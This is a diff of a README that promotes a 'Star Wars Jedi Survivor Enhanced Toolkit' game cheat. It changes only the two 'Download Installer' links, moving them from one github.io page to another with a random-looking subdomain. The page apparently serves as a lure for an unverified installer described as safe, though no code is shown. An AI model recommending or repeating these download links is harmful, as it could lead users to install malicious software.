@@ -2,7 +2,7 @@
 
 The Star Wars Jedi Survivor Enhanced Toolkit is a comprehensive utility designed to enhance your gameplay experience. This tool provides features for health management, force augmentation, and skill customization, all within a safe and user-friendly interface for Windows 10 and 11 users. Whether you're looking to overcome challenging sections or explore the game with modified settings, this toolkit offers a seamless way to tailor your adventure.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -70,7 +70,7 @@ A: No, the toolkit works entirely offline. However, an internet connection may b
 
 To get the latest version of the Star Wars Jedi Survivor Enhanced Toolkit, click the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
